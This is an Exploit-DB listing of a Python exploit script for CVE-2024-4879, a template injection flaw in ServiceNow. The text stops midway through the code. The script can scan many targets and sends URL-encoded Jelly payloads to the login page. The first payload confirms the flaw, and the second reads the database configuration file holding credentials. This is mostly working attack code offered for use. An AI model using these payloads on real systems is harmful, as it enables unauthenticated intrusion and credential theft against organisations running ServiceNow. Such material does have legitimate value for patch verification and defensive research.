---
title: [webapps] ServiceNow Multiple Versions - Input Validation & Template Injection
url: https://www.exploit-db.com/exploits/52410
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:47:51.100778
---

# [webapps] ServiceNow Multiple Versions - Input Validation & Template Injection

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# ServiceNow Multiple Versions - Input Validation & Template Injection

#### EDB-ID:

###### 52410

#### CVE:

###### [2024-4879](https://nvd.nist.gov/vuln/detail/CVE-2024-4879)

---

**EDB Verified:**

#### Author:

###### [İbrahimsql](/?author=12279)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
#!/usr/bin/env python3
"""
# Title : ServiceNow Multiple Versions - Input Validation & Template Injection
# Date: 2025-01-31
# Author: ibrahimsql
# Vendor: ServiceNow
# Version: Vancouver, Washington DC, Utah (various patches)
# affected from 0 before Utah Patch 10 Hot Fix 3
# affected from 0 before Utah Patch 10a Hot Fix 2
# affected from 0 before Vancouver Patch 6 Hot Fix 2
# affected from 0 before Vancouver Patch 7 Hot Fix 3b
# affected from 0 before Vancouver Patch 8 Hot Fix 4
# affected from 0 before Vancouver Patch 9
# affected from 0 before Vancouver Patch 10
# affected from 0 before Washington DC Patch 1 Hot Fix 2b
# affected from 0 before Washington DC Patch 2 Hot Fix 2
# affected from 0 before Washington DC Patch 3 Hot Fix 1
# affected from 0 before Washington DC Patch 4
# Tested on: ServiceNow Platform
# CVE: CVE-2024-4879
# Category: Input Validation
# CVSS Score: 9.8 (Critical)
# CWE: CWE-20 (Improper Input Validation)

# Description:
# ServiceNow Platform contains an input validation vulnerability that allows
# unauthenticated remote code execution. The vulnerability affects Vancouver,
# Washington DC, and Utah releases of the Now Platform.

# Impact:
# - Unauthenticated remote code execution
# - Complete system compromise
# - Data exfiltration
# - Service disruption

# Requirements:
# - requests>=2.25.1
# - colorama>=0.4.4
# - urllib3

# Usage:
# python3 CVE-2024-4879.py -t https://target.service-now.com
# python3 CVE-2024-4879.py -f targets.txt
"""

from colorama import Fore, Style, init
import requests
import argparse
import urllib3
import concurrent.futures
import sys
import re
from urllib.parse import urlparse

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    WHITE = Fore.WHITE
    CYAN = Fore.CYAN
    MAGENTA = Fore.MAGENTA
    RESET = Style.RESET_ALL

banner = f"""
{Colors.CYAN}
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗      ██╗  ██╗ █████╗ ███████╗ █████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ██║  ██║██╔══██╗╚════██║██╔══██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗███████║╚█████╔╝    ██╔╝╚██████║
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝╚════██║██╔══██╗   ██╔╝  ╚═══██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║           ██║╚█████╔╝   ██║   █████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝           ╚═╝ ╚════╝    ╚═╝   ╚════╝
{Colors.RESET}
{Colors.YELLOW}ServiceNow Platform Input Validation Vulnerability{Colors.RESET}
{Colors.WHITE}CVE-2024-4879 | CVSS: 9.8 (Critical) | Author: ibrahimsql{Colors.RESET}
"""

class ServiceNowExploit:
    def __init__(self, timeout=10, verbose=False):
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False

    def _log(self, level, message, url=""):
        """Enhanced logging with colors and levels"""
        timestamp = "[*]"
        if level == "success":
            print(f"{Colors.GREEN}[+]{Colors.RESET} {message} {Colors.WHITE}{url}{Colors.RESET}")
        elif level == "error":
            print(f"{Colors.RED}[-]{Colors.RESET} {message} {Colors.WHITE}{url}{Colors.RESET}")
        elif level == "warning":
            print(f"{Colors.YELLOW}[!]{Colors.RESET} {message} {Colors.WHITE}{url}{Colors.RESET}")
        elif level == "info":
            print(f"{Colors.BLUE}[*]{Colors.RESET} {message} {Colors.WHITE}{url}{Colors.RESET}")
        elif level == "verbose" and self.verbose:
            print(f"{Colors.CYAN}[V]{Colors.RESET} {message} {Colors.WHITE}{url}{Colors.RESET}")

    def validate_url(self, url):
        """Validate and normalize URL format"""
        if not url.startswith(('http://', 'https://')):
            url = f"https://{url}"

        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                return None
            return url
        except Exception:
            return None

    def check_target_reachability(self, url):
        """Check if target is reachable"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            if response.status_code == 200:
                self._log("info", "Target is reachable", url)
                return True
            else:
                self._log("warning", f"Target returned status {response.status_code}", url)
                return False
        except requests.exceptions.RequestException as e:
            self._log("error", f"Target unreachable: {str(e)}", url)
            return False

    def exploit_vulnerability(self, url):
        """Main exploit function for CVE-2024-4879"""
        try:
            # Normalize URL
            url = self.validate_url(url)
            if not url:
                self._log("error", "Invalid URL format")
                return False

            # Check reachability first
            if not self.check_target_reachability(url):
                return False

            # Construct the exploit payload
            exploit_path = "/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(668.5*2);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E"
            exploit_url = f"{url}{exploit_path}"

            self._log("info", "Testing for CVE-2024-4879 vulnerability", url)

            # Send exploit request
            response = self.session.get(exploit_url, timeout=self.timeout)

            if self.verbose:
                self._log("verbose", f"Response status: {response.status_code}")
                self._log("verbose", f"Response length: {len(response.text)}")

            # Check for vulnerability indicator
            if response.status_code == 200 and "1337" in response.text:
                self._log("success", "VULNERABLE - CVE-2024-4879 confirmed!", url)

                # Attempt to extract sensitive information
                info_path = "/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly:core%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Ez=new%20Packages.java.io.File(%22%22).getAbsolutePath();z=z.substring(0,z.lastIndexOf(%22/%22));u=new%20SecurelyAccess(z.concat(%22/conf/glide.db.properties%22)).getBufferedReader();s=%22%22;while((q=u.readLine())!==null)s=s.concat(q,%22%5Cn%22);gs.addErrorMessage(s);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E"
                info_url = f"{url}{info_path}"

                try:
                    info_response = self.session.get(info_url, timeout=self.timeout)
                    if info_response.status_code == 200:
                        self._log("success", "Database configuration extracted!")
                        if self.verbose:
                            print(f"\n{Colors.YELLOW}=== Database Configuration ==={Col...